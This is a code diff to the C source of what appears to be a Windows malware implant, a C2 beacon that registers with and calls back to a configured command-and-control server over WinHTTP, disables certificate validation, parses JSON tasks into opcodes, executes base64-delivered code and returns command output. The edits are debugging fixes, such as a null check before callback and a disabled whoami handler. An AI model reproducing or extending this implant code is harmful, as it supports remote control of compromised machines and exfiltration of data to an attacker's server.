@@ -136,9 +136,6 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     }
 
     // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked
-
-    // INTERNET_OPTION_HTTP_DECODING
-
     flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
     printf("four\n");
     if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
@@ -275,6 +272,8 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     LPCSTR*             UriBuffer;
     DWORD               flags;
 
+    OutputDebugStringA("inside BeaconCallbackC2\n");
+
     struct json_object *parsed_json;
 
     // check if we doing a normal checkin or sending data
@@ -409,7 +408,6 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     CheckIfDie(ResBuffer);
 
     // get the opcode
-
     parsed_json = json_tokener_parse(ResBuffer);
     parsed_json = json_object_object_get(parsed_json, "task");
     *OpCode     = json_object_get_int(parsed_json);
@@ -451,7 +449,7 @@ BOOL ExecuteCode(char* Base64Buffer, BOOL CodeType)
 
 BOOL Stdlib(char* Buffer)
 {
-    char* data;
+    char* data = NULL;
     DWORD rOpCode;
     struct json_object *parsed_json;
     
@@ -493,17 +491,26 @@ BOOL Stdlib(char* Buffer)
         data = changedir(args);
         break;
     
-    case 0x7000:
-        data = whoami(args);
-        break;
-    
-    default:
+    // I have no idea why this doesnt work.
+    // case 0x7000:
+    //     // rewrite
+    //     if (strlen(args) == 0)
+    //     {
+    //         data = whoami(FALSE);
+    //     } else {
+    //         data = whoami(TRUE);
+    //     }
+    //     break;
+
+    case 0x8000:
         break;
     }
 
-    printf("calling back\n");
-    BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, &rOpCode, data, DO_CALLBACK, strlen(data));
-    
+    if (data != NULL)
+    {
+        BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, &rOpCode, data, DO_CALLBACK, strlen(data));
+    }
+
     return TRUE;
 }
 
